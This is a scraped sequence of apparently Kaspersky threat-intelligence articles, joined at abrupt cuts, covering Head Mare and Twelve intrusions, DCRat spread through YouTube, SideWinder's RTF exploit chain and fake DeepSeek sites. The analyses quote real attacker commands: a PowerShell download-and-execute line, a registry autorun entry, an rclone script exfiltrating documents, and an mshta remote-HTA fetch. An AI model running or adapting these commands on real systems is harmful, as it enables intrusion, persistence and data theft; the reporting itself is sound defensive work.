reconnaissance, along with ADRecon, a tool for gathering information from Active Directory. ADRecon is a PowerShell script not previously observed in the group&#8217;s arsenal.</p>\n<p>The attackers also used ADRecon to study the Active Directory domain, including computers, accounts, groups, and trust relationships between domains. The command history showed various domains passed as arguments to the script:</p><pre class=\"crayon-plain-tag\">.\\ADRecon.ps1 -DomainController &lt;FQDN A&gt;\n.\\ADRecon.ps1 -DomainController &lt;FQDN B&gt;\n.\\ADRecon.ps1 -DomainController &lt;FQDN C&gt;\n&lt;..&gt;</pre><p>\n<h3 id=\"privilege-escalation\">Privilege Escalation</h3>\n<p>The attackers exploited previously compromised accounts of victims and their contractors, and created privileged local accounts, particularly when exploiting the business automation software server. If a user has sufficient permissions to remotely execute commands on the server, this software allows running a child command prompt process, such as cmd.exe, with privileges in the operating system corresponding to the program&#8217;s privileges. Since business automation software typically has administrator privileges in the OS, the child process also becomes privileged. The attackers exploited this opportunity: after gaining access to the vulnerable software server, they created a privileged local account on whose behalf they launched a command interpreter.</p>\n<h3 id=\"command-execution\">Command Execution</h3>\n<p>The attackers launched the Windows command interpreter on the business automation platform server in the target system within a process that executed the following command line:</p><pre class=\"crayon-plain-tag\">cmd /c powershell.exe -ep bypass -w hidden -c iex ((New-Object \nNet.WebClient).DownloadString('http://web-telegram[.]uk/vivo.txt')) &gt; $temp\\v8_B5B0_11.txt</pre><p>\nThis command downloads and executes the vivo.txt file, which we were unable to obtain. However, based on system events, we suspect that it opened a reverse shell, which the operator used to create two files in the target system.</p><pre class=\"crayon-plain-tag\">c:\\programdata\\microsoftdrive\\mcdrive.vbs\nc:\\programdata\\microsoftdrive\\mcdrive.ps1</pre><p>\nThen, using reg.exe, the attackers added an autorun entry to execute mcdrive.vbs with the interpreter wscript.exe.</p><pre class=\"crayon-plain-tag\">reg  add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"mcdrivesvc\" /t \nREG_EXPAND_SZ /d \"wscript.exe \\\"$appdata\\MicrosoftDrive\\mcdrive.vbs</pre><p>\nThe VBS file is an obfuscated Visual Basic script that creates an ActiveX object reference named WScript.Shell and uses its Run() function to execute an obfuscated command line.</p>\n<p>A deobfuscated command line snippet follows:</p><pre class=\"crayon-plain-tag\">%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ex bypass -NoLogo -\nNonInteractive -NoProfile -w hidden -c iex \n([System.IO.File]::ReadAllText('C:\\ProgramData\\MicrosoftDrive\\mcdrive.ps1'))</pre><p>\nThis command reads and executes the C:\\ProgramData\\MicrosoftDrive\\mcdrive.ps1 file through the PowerShell interpreter. This file is a <strong>CobInt</strong> loader, previously seen only in Twelve&#8217;s arsenal. The mcdrive.ps1 snippet below determines the operating system&#8217;s bitness, decrypts, and executes the payload, which initiates a request to a C2 server at 360nvidia[.]com.

The IP address shown on the graph corresponds to the domain 360nvidia.com</p></div>\n<h3 id=\"credential-access\">Credential Access</h3>\n<p>The investigation identified tools for obtaining credentials. Besides the publicly available mimikatz utility, the attackers used secretsdump and ProcDump.

Normally, this file name is used by the legitimate Windows update process. However, the script&#8217;s launch parameters indicated that the file was actually the rclone.exe utility. Rclone is an open-source project for copying and synchronizing files between storages of different types, making it convenient for data transfer.</p><pre class=\"crayon-plain-tag\">@echo off\nsetlocal enabledelayedexpansion\nset inputFile=C:\\ProgramData\\1.txt\nfor /f \"tokens=*\" %%A in (%inputFile%) do (\n    set hostname=%%A\n    start /wait \"\" C:\\ProgramData\\wusa.exe --config=\"C:\\ProgramData\\1.conf\" --sftp-socks-proxy &lt;username&gt;:&lt;password&gt;@64.7.198.109:80 sync \"\\\\%%A\\C$\\Users\" sftpP:/data/&lt;path&gt; -q --ignore-existing --auto-confirm --include \"*.doc\" --include \"*.docx\" --include \"*Desktop/**\" --include \"*Documents/**\" --include \"*Downloads/**\" --include \"*.pdf\" --include \"*.xls\" --include \"*.xlsx\" --include \"*.zip\" --include \"*.rar\" --include \"*.txt\" --include \"*.pn*\" --include \"*.ppt\" --include \"*.pptx\" --include \"*.jp*\" --include \"*.eml\" --include \"*.pst\" --multi-thread-streams 12 --transfers 12 --max-age 3y --max-size 1G\n)\nendlocal</pre><p>\nThe script starts by taking the file 1.txt as input, which contains a list of hosts. For each host, it runs rclone.exe to transfer files from the device to an SFTP server through a SOCKS proxy. The attackers only exfiltrated files from specific directories or files matching the extension templates specified in the script.</p>\n<h3 id=\"final-goal-file-encryption\">Final goal: file encryption</h3>\n<p>As in <a href=\"https://securelist.com/head-mare-hacktivists/113555/\" rel=\"noopener\" target=\"_blank\">previous attacks</a>, they encrypted data using variants of LockBit 3.0 (for Windows systems) and Babuk (for NAS devices). The investigation found that the LockBit file was initially saved on the victim&#8217;s host at the following paths:</p>\n<ul>\n<li>C:\\Users\\{username}\\Desktop\\locker.exe;</li>\n<li>С:\\Windows\\SYSVOL\\Intel\\locker.exe.</li>\n</ul>\n<p>Below is a sample ransom note, with the cybercriminals&#8217; contacts redacted:</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115892\" style=\"width: 692px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/11131429/Head_Mare__Twelve_02.png\"><img alt=\"Contents of a LockBit ransom note\" class=\"size-full wp-image-115892\" height=\"181\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/11131429/Head_Mare__Twelve_02.png\" width=\"682\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115892\">Contents of a LockBit ransom note</p></div>\n<h3 id=\"connection-between-head-mare-and-twelve\">Connection between Head Mare and Twelve</h3>\n<p>In addition to the aforementioned TTPs, we attribute these attacks to Head Mare based on the following characteristics:</p>\n<ol>\n<li>A previously seen IP address:\n<ul>\n<li>45.156.21[.]148</li>\n</ul>\n</li>\n<li>Malware:\n<ul>\n<li>PhantomJitter</li>\n</ul>\n</li>\n</ol>\n<p>Further details about these indicators can be found in the private report on the Threat Intelligence Portal: &#8220;HeadMare&#8217;s new PhantomJitter backdoor dropped in attacks exploiting Microsoft Exchange&#8221;.</p>\n<p>However, the presence of Twelve&#8217;s tools like CobInt suggests collaboration. To test this hypothesis, activity cluster diagrams were created based on <a href=\"https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/diamond-model-intrusion-analysis/\" rel=\"noopener\" target=\"_blank\">the Diamond Model framework</a>. Overlaps – common elements in the tactics of both groups – are highlighted in red, indicating potential coordination.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115901\" style=\"width: 633px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092741/Head_Mare_twelve_03_en.jpg\"><img alt=\"Analysis of the Head Mare techniques and tools\" class=\"size-full wp-image-115901\" height=\"260\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092741/Head_Mare_twelve_03_en.jpg\" width=\"623\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115901\">Analysis of the Head Mare techniques and tools</p></div>\n<p>In the image above, we see for the first time the use of the <strong>CobInt malware</strong> in Head Mare attacks.

In recent attacks, they gained initial access to the target infrastructure by not only using phishing emails with exploits but also by compromising contractors.</p>\n<p>They also use tools previously seen in attacks by other groups, such as Twelve&#8217;s <strong>CobInt</strong> backdoor.</p>\n<p>This is not the only similarity between the two groups. In addition to the toolkit, the following were noticed:</p>\n<ul>\n<li>Shared command-and-control servers: 360nvidia[.]com, 45.156.27[.]115</li>\n<li>PowerShell scripts accessing these C2 servers: mcdrive.ps1</li>\n<li>Scripts for tunneling network connections: proxy.ps1</li>\n</ul>\n<p>Based on the factors described above, we assume that Head Mare is working with Twelve to launch attacks on state- and privately controlled companies in Russia. We will continue to monitor the activity of the attackers and share up-to-date information about their TTPs.

What is more, GERT experts discovered noteworthy malicious campaigns like <a href=\"https://securelist.com/tusk-infostealers-campaign/113367/\" rel=\"noopener\" target=\"_blank\">Tusk</a> and a <a href=\"https://securelist.com/patched-forticlient-ems-vulnerability-exploited-in-the-wild/115046/\" rel=\"noopener\" target=\"_blank\">set of incidents</a> with CVE-2023-48788 exploited.</p>\n<p>Another alarming trend identified in real incident response cases is wider use of such tools as Mimikatz (21.8%) and PsExec (20.0%). They are commonly used during post-exploitation for password extraction and lateral movement. We also observe a strengthening tendency for data leakage to be the second most common reason for an incident response request, amounting to 16.9% of all incidents, which correlates with our assumptions regarding trends in credential access techniques.</p>\n<h2 id=\"recommendations-for-preventing-incidents\">Recommendations for preventing incidents</h2>\n<p>To protect your organization against cyberthreats and minimize the damage in the case of an attack, Kaspersky GERT experts recommend:</p>\n<ul>\n<li>Implementing a strong password policy and using multi-factor authentication</li>\n<li>Removing management ports from public access</li>\n<li>Adopting secure development practices to prevent insecure code from reaching production environments</li>\n<li>Establishing a zero-tolerance policy for patch management, or having compensation measures in place for public-facing applications</li>\n<li>Ensuring that employees maintain a high level of security awareness</li>\n<li>Implementing rules to detect utilities commonly used by adversaries</li>\n<li>Conducting frequent, regular <a href=\"https://securelist.com/compromise-assessment-cases/114332/\" target=\"_blank\">compromise assessment</a> activities</li>\n<li>Employing a security tool set that includes EDR-like telemetry</li>\n<li>Constantly testing the security operations team&#8217;s response times with simulated attacks</li>\n<li>Prohibiting the use of any software being used within the corporate network that is known to be used by attackers</li>\n<li>Regularly backing up your data</li>\n<li>Working with an Incident Response Retainer partner to address incidents with fast SLAs</li>\n<li>Implementing strict security programs for applications that handle personal information</li>\n<li>Implementing security access control over important data using DLP</li>\n<li>Continuously training your incident response team to maintain their expertise and stay up-to-date with the evolving threat landscape</li>\n</ul>\n<p>The <a href=\"https://www.kaspersky.com/enterprise-security/resources/reports/mdr-ir-analyst-reports/?utm_source=securelist&amp;utm_medium=social&amp;utm_campaign=ir_report\" rel=\"noopener\" target=\"_blank\">full 2024 Incident Response Report</a> features additional information about real-life incidents, including new threats discovered by Kaspersky experts.

The cybercriminal group behind it also offers support for the malware and infrastructure setup for hosting the C2 servers.</p>\n<h2 id=\"distribution\">Distribution</h2>\n<p>The DCRat backdoor is distributed through the YouTube platform. Attackers create fake accounts or use stolen ones, then upload videos advertising cheats, cracks, gaming bots and similar software. In the video description is a download link to the product supposedly being advertised. The link points to a legitimate file-sharing service where a password-protected archive awaits, the password for which is also in the video description.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115859\" style=\"width: 750px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07154556/DarkCrystal_RAT_01.png\"><img alt=\"YouTube video ad for a cheat and crack\" class=\"size-large wp-image-115859\" height=\"1024\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07154556/DarkCrystal_RAT_01-740x1024.png\" width=\"740\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115859\">YouTube video ad for a cheat and crack</p></div>\n<p>Instead of gaming software, these archives contain the DCRat Trojan, along with various junk files and folders to distract the victim&#8217;s attention.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115860\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07154912/DarkCrystal_RAT_02.png\"><img alt=\"Archives with DCRat disguised as a cheat and crack\" class=\"size-large wp-image-115860\" height=\"1001\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07154912/DarkCrystal_RAT_02-1024x1001.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115860\">Archives with DCRat disguised as a cheat and crack</p></div>\n<h2 id=\"backdoor\">Backdoor</h2>\n<p>The distributed backdoor belongs to a family of remote access Trojans (RATs) dubbed Dark Crystal RAT (DCRat for short), known since 2018. Besides backdoor capability, the Trojan can load extra modules to boost its functionality. Throughout the backdoor&#8217;s existence, we have obtained and analyzed 34 different plugins, the most dangerous functions of which are keystroke logging, webcam access, file grabbing and password exfiltration.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115861\" style=\"width: 701px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07154943/DarkCrystal_RAT_03.png\"><img alt=\"DCRat builder plugins on the attackers' site\" class=\"size-full wp-image-115861\" height=\"394\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07154943/DarkCrystal_RAT_03.png\" width=\"691\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115861\">DCRat builder plugins on the attackers&#8217; site</p></div>\n<h2 id=\"infrastructure\">Infrastructure</h2>\n<p>To support the infrastructure, the attackers register second-level domains (most often in the RU zone), which they use to create third-level domains for hosting the C2 servers. The group has registered at least 57 new second-level domains since the start of the year, five of which already serve more than 40 third-level domains.</p>\n<p>A distinctive feature of the campaign is the appearance of certain words in the second-level domains of the malicious infrastructure, such as &#8220;nyashka&#8221;, &#8220;nyashkoon&#8221;, &#8220;nyashtyan&#8221;, etc. Users interested in Japanese pop culture will surely recognize these slang terms. Among anime and manga fans, &#8220;nyasha&#8221; has come to mean &#8220;cute&#8221; or &#8220;hon&#8221;, and it&#8217;s this word that&#8217;s most often seen in the second-level domains.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115862\" style=\"width: 684px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07155053/DarkCrystal_RAT_04.png\"><img alt=\"C2 server addresses with characteristic naming approach\" class=\"size-full wp-image-115862\" height=\"349\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07155053/DarkCrystal_RAT_04.png\" width=\"674\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115862\">C2 server addresses with characteristic naming approach</p></div>\n<h2 id=\"victims\">Victims</h2>\n<p>Based on our telemetry data since the beginning of 2025, 80% of DCRat samples using such domains as C2 servers were downloaded to the devices of users in Russia. The malware also affected a small number of users from Belarus, Kazakhstan and China.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Kaspersky products detect the above-described samples with the verdict <pre class=\"crayon-plain-tag\">Backdoor.MSIL.DCRat</pre>.</p>\n<p>Note that we also encounter campaigns distributing other types of malware (stealers, miners, loaders) through password-protected archives, so we strongly recommend downloading game-related software only from trusted sources.</p>",

In it, we described activities that had mostly happened in the first half of the year. We tried to draw attention to the group, which was aggressively extending its activities beyond their typical targets, infecting government entities, logistics companies and maritime infrastructures in South and Southeast Asia, the Middle East, and Africa. We also shared further information about SideWinder&#8217;s post-exploitation activities and described a new sophisticated implant designed specifically for espionage.</p>\n<p>We continued to monitor the group throughout the rest of the year, observing intense activity that included updates to SideWinder&#8217;s toolset and the creation of a massive new infrastructure to spread malware and control compromised systems. The targeted sectors were consistent with those we had seen in the first part of 2024, but we noticed a new and significant increase in attacks against maritime infrastructures and logistics companies.</p>\n<p>In 2024, we initially observed a significant number of attacks in Djibouti. Subsequently, the attackers shifted their focus to other entities in Asia and showed a strong interest in targets within Egypt.</p>\n<p>Moreover, we observed other attacks that indicated a specific interest in nuclear power plants and nuclear energy in South Asia and further expansion of activities into new countries, especially in Africa.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115868\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082407/SideWinder-graphics_1.png\"><img alt=\"Countries and territories targeted by SideWinder in the maritime and logistics sectors in 2024\" class=\"size-large wp-image-115868\" height=\"635\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082407/SideWinder-graphics_1-1024x635.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115868\">Countries and territories targeted by SideWinder in the maritime and logistics sectors in 2024</p></div>\n<p>It is worth noting that SideWinder constantly works to improve its toolsets, stay ahead of security software detections, extend persistence on compromised networks, and hide its presence on infected systems. Based on our observation of the group&#8217;s activities, we presume they are constantly monitoring detections of their toolset by security solutions. Once their tools are identified, they respond by generating a new and modified version of the malware, often in under five hours. If behavioral detections occur, SideWinder tries to change the techniques used to maintain persistence and load components. Additionally, they change the names and paths of their malicious files. Thus, monitoring and detection of the group&#8217;s activities reminds us of a ping-pong game.</p>\n<h2 id=\"infection-vectors\">Infection vectors</h2>\n<p>The infection pattern observed in the second part of 2024 is consistent with the one described in the previous article.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115854\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07150955/SideWinder_02.png\"><img alt=\"Infection flow\" class=\"size-large wp-image-115854\" height=\"581\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07150955/SideWinder_02-1024x581.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115854\">Infection flow</p></div>\n<p>The attacker sends spear-phishing emails with a DOCX file attached.

For example, we found a document with information on renting a car in Bulgaria, a document expressing an intent to buy a garage, and another document offering a freelance video game developer a job working on a 3D action-adventure game called &#8220;Galactic Odyssey&#8221;.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115857\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07153026/SideWinder_05.png\"><img alt=\"Examples of generic malicious documents\" class=\"size-large wp-image-115857\" height=\"284\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07153026/SideWinder_05-1024x284.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115857\">Examples of generic malicious documents</p></div>\n<h2 id=\"rtf-exploit\">RTF exploit</h2>\n<p>The exploit file contained a shellcode, which had been updated by the attacker since our previous research, but the main goal remained the same: to run embedded JavaScript code invoking the <pre class=\"crayon-plain-tag\">mshtml.RunHTMLApplication</pre> function.</p>\n<p>In the new version, the embedded JavaScript runs the Windows utility <pre class=\"crayon-plain-tag\">mshta.exe</pre> and obtains additional code from a remote server:</p><pre class=\"crayon-plain-tag\">javascript:eval(\"var gShZVnyR = new ActiveXObject('WScript.Shell');gShZVnyR.Run('mshta.exe\nhttps://dgtk.depo-govpk[.]com/19263687/trui',0);window.close();\")</pre><p>\nThe newer version of the shellcode still uses certain tricks to avoid sandboxes and complicate analysis, although they differ slightly from those in past versions.</p>\n<ul>\n<li>It uses the <pre class=\"crayon-plain-tag\">GlobalMemoryStatusEx</pre> function to determine the size of RAM.</li>\n<li>It attempts to load the <pre class=\"crayon-plain-tag\">nlssorting.dll</pre> library and terminates execution if operation succeeds.</li>\n</ul>\n<h2 id=\"javascript-loader\">JavaScript loader</h2>\n<p>The RTF exploit led to the execution of the <pre class=\"crayon-plain-tag\">mshta.exe</pre> Windows utility, abused to download a malicious HTA from a remote server controlled by the attacker.</p><pre class=\"crayon-plain-tag\">mshta.exe hxxps://dgtk.depo-govpk[.]com/19263687/trui</pre><p>\nThe remote HTA embeds a heavily obfuscated JavaScript file that loads further malware, the &#8220;Downloader Module&#8221;, into memory.</p>\n<p>The JavaScript loader operates in two stages. The first stage begins execution by loading various strings, initially encoded with a substitution algorithm and stored as variables. It then checks the installed RAM and terminates if the total size is less than 950 MB. Otherwise, the previously decoded strings are used to load the second stage.</p>\n<p>The second stage is another JavaScript file. It enumerates the subfolders at Windows%\\Microsoft.NET\\Framework\\ to find the version of the .NET framework installed on the system and uses the resulting value to configure the environment variable <pre class=\"crayon-plain-tag\">COMPLUS_Version</pre>.</p>\n<p>Finally, the second stage decodes and loads the Downloader Module, which is embedded within its code as a base64-encoded .NET serialized stream.</p>\n<h2 id=\"downloader-module\">Downloader Module</h2>\n<p>This component is a .NET library used to collect information about the installed security solution and download another component, the &#8220;Module Installer&#8221;. These components were already described in the <a href=\"https://securelist.com/sidewinder-apt/114089/\" rel=\"noopener\" target=\"_blank\">previous article</a> and will not be detailed again here.</p>\n<p>In our latest investigation, we discovered a new version of the <pre class=\"crayon-plain-tag\">app.dll</pre> Downloader Module, which includes a more sophisticated function for identifying installed security solutions.</p>\n<p>In the previous version, the malware used a simple WMI query to obtain a list of installed products. The new version uses a different WMI, which collects the name of the antivirus and the related &#8220;productState&#8221;.</p>\n<p>Furthermore, the malware compares all running process names against an embedded dictionary. The dictionary contains 137 unique process names associated with popular security solutions.<br />\nThe WMI query is executed only when no Kaspersky processes are running on the system.</p>\n<h2 id=\"backdoor-loader\">Backdoor Loader</h2>\n<p>The infection chain concludes with the installation of malware that we have named &#8220;Backdoor Loader&#8221;, a library consistently sideloaded using a legitimate and signed application. Its primary function is to load the &#8220;StealerBot&#8221; implant into memory. Both the &#8220;Backdoor Loader&#8221; and &#8220;StealerBot&#8221; were thoroughly described in our prior article, but the attacker has distributed numerous variants of the loader in recent months, whereas the implant has remained unchanged.</p>\n<p>In the previous campaign, the &#8220;Backdoor Loader&#8221; library was designed to be loaded by two specific programs. For correct execution, it had to be stored on victims&#8217; systems under one of the following names:</p><pre class=\"crayon-plain-tag\">propsys.dll\nvsstrace.dll</pre><p>\nDuring the most recent campaign, the attackers tried to diversify the samples, generating many other variants distributed under the following names:</p><pre class=\"crayon-plain-tag\">JetCfg.dll\npolicymanager.dll\nwinmm.dll\nxmllite.dll\ndcntel.dll\nUxTheme.dll</pre><p>\nThe new malware variants feature an enhanced version of anti-analysis code and employ Control Flow Flattening more extensively to evade detection.</p>\n<p>During the investigation, we found a new C++ version of the &#8220;Backdoor Loader&#8221; component. The malware logic is the same as that used in the .NET variants, but the C++ version differs from the .NET implants in that it lacks anti-analysis techniques. Furthermore, most of the samples were tailored to specific targets, as they were configured to load the second stage from a specific file path embedded in the code, which also included the user&#8217;s name. Example:</p><pre class=\"crayon-plain-tag\">C:\\Users\\[REDACTED]\\AppData\\Roaming\\valgrind\\[REDACTED FILE NAME].[REDACTED EXTENSION]</pre><p>\nIt indicates that these variants were likely used after the infection phase and manually deployed by the attacker within the already compromised infrastructure, after validating the victim.</p>\n<h2 id=\"victims\">Victims</h2>\n<p>SideWinder continues to attack its usual targets, especially government, military, and diplomatic entities. The targeted sectors are consistent with those observed in the past, but it is worth mentioning that the number of attacks against the maritime and the logistics sectors has increased and expanded to Southeast Asia.</p>\n<p>Furthermore, we observed attacks against entities associated with nuclear energy. The following industries were also affected: telecommunication, consulting, IT service companies, real estate agencies, and hotels.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115869\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082420/SideWinder-graphics_2.png\"><img alt=\"Countries and territories targeted by SideWinder in 2024\" class=\"size-large wp-image-115869\" height=\"961\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082420/SideWinder-graphics_2-1024x961.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115869\">Countries and territories targeted by SideWinder in 2024</p></div>\n<p>Overall, the group has further extended its activities, especially in Africa. We detected attacks in Austria, Bangladesh, Cambodia, Djibouti, Egypt, Indonesia, Mozambique, Myanmar, Nepal, Pakistan, Philippines, Sri Lanka, the United Arab Emirates, and Vietnam.</p>\n<p>In this latest wave of attacks, SideWinder also targeted diplomatic entities in Afghanistan, Algeria, Bulgaria, China, India, the Maldives, Rwanda, Saudi Arabia, Turkey, and Uganda.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>SideWinder is a very active and persistent actor that is constantly evolving and improving its toolkits. Its basic infection method is the use of an old Microsoft Office vulnerability, <a href=\"https://www.kaspersky.com/blog/cve-2017-11882-exploitation-on-the-rise/48768/\" rel=\"noopener\" target=\"_blank\">CVE-2017-11882</a>, which once again emphasizes the critical importance of installing security patches.</p>\n<p>Despite the use of an old exploit, we should not underestimate this threat actor. In fact, SideWinder has already demonstrated its ability to compromise critical assets and high-profile entities, including those in the military and government. We know the group&#8217;s software development capabilities, which became evident when we observed how quickly they could deliver updated versions of their tools to evade detection, often within hours. Furthermore, we know that their toolset also includes advanced malware, like the sophisticated in-memory implant &#8220;StealerBot&#8221; described in our previous article. These capabilities make them a highly advanced and dangerous adversary.</p>\n<p>To protect against such attacks, we strongly recommend maintaining a patch management process to apply security fixes (you can use solutions like <a href=\"https://www.kaspersky.com/small-to-medium-business-security/systems-management?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team___ksysm____49792969949dc2ac\" rel=\"noopener\" target=\"_blank\">Vulnerability Assessment and Patch Management</a> and <a href=\"https://www.kaspersky.com/vuln-feed?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______371398534a23cb78\" rel=\"noopener\" target=\"_blank\">Kaspersky Vulnerability Data Feed</a>) and using a comprehensive security solution that provides incident detection and response, as well as threat hunting. <a href=\"https://www.kaspersky.com/enterprise-security/xdr?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team___xdr____33801aaaec3e63b3\" rel=\"noopener\" target=\"_blank\">Our product line for businesses</a> helps identify and prevent attacks of any complexity at an early stage.

It&#8217;s available both for local use and as a free service. Since DeepSeek was the first service to offer access to a reasoning LLM to a wide audience, it quickly gained popularity, mirroring the success of ChatGPT. Naturally, this surge in interest also attracted cybercriminals.</p>\n<p>While analyzing our internal threat intelligence data, we discovered several groups of websites mimicking the official DeepSeek chatbot site and distributing malicious code disguised as a client for the popular service.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115816\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05145826/DeepSeek_malware_01.png\"><img alt=\"Screenshot of the official DeepSeek website (February 2025)\" class=\"size-large wp-image-115816\" height=\"495\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05145826/DeepSeek_malware_01-1024x495.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115816\">Screenshot of the official DeepSeek website (February 2025)</p></div>\n<h2 id=\"scheme-1-python-stealer-and-non-existent-deepseek-client\">Scheme 1: Python stealer and non-existent DeepSeek client</h2>\n<p>The first group of websites was hosted on domains whose names included DeepSeek model versions (V3 and R1):</p>\n<ul>\n<li><pre class=\"crayon-plain-tag\">r1-deepseek[.]net</pre>;</li>\n<li><pre class=\"crayon-plain-tag\">v3-deepseek[.]com</pre>.</li>\n</ul>\n<p>As shown in the screenshot, the fake website lacks the option to start a chat – you can only download an application.

This is a stealer script written in Python that we haven&#8217;t seen in attacks before. If it&#8217;s executed successfully, the attackers obtain a wealth of data from the victim&#8217;s computer: cookies and session tokens from various browsers, login credentials for email, gaming, and other accounts, files with certain extensions, cryptocurrency wallet information, and more.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153222/DeepSeek_malware_07.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115822\" height=\"449\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153222/DeepSeek_malware_07-1024x449.png\" width=\"1024\" /></a></p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153255/DeepSeek_malware_08.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115823\" height=\"784\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153255/DeepSeek_malware_08-1024x784.png\" width=\"1024\" /></a></p>\n<p>After collecting the necessary data, the script generates an archive and then either sends it to the stealer&#8217;s operators using a Telegram bot or uploads it to the Gofile file-sharing service. Thus, attempting to use the chatbot could result in the victim losing social media access, personal data, and even cryptocurrency. If corporate credentials are stored on the compromised device, entire organizations could also be at risk, leading to far more severe consequences.</p>\n<h2 id=\"scheme-2-malicious-script-and-a-million-views\">Scheme 2: Malicious script and a million views</h2>\n<p>In another case, fake DeepSeek websites were found on the following domains:</p>\n<ul>\n<li><pre class=\"crayon-plain-tag\">deepseek-pc-ai[.]com</pre></li>\n<li><pre class=\"crayon-plain-tag\">deepseek-ai-soft[.]com</pre></li>\n</ul>\n<p>We discovered the first domain back in early February, hosting the default Apache web server page with no content. Later, this domain displayed a new web page closely resembling the DeepSeek website. Notably, the fake site uses <a href=\"https://encyclopedia.kaspersky.com/glossary/geofencing/\" rel=\"noopener\" target=\"_blank\">geofencing</a>: when requests come from certain IP addresses, such as Russian ones, it returns a placeholder page filled with generic SEO text about DeepSeek (we believe this text may have been <a href=\"https://securelist.com/llm-phish-blunders/114367/\" rel=\"noopener\" target=\"_blank\">LLM-generated</a>):</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153419/DeepSeek_malware_09.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115824\" height=\"495\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153419/DeepSeek_malware_09-1024x495.png\" width=\"1024\" /></a></p>\n<p>If the IP address and other request parameters meet the specified criteria, the server returns a page resembling DeepSeek. Users are prompted to download a client or start the chatbot, but either action results in downloading a malicious installer created using <a href=\"https://en.wikipedia.org/wiki/Inno_Setup\" rel=\"noopener\" target=\"_blank\">Inno Setup</a>. Kaspersky products detect it as <pre class=\"crayon-plain-tag\">Trojan-Downloader.Win32.TookPS.*</pre>.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06075655/7.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115843\" height=\"431\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06075655/7-1024x431.png\" 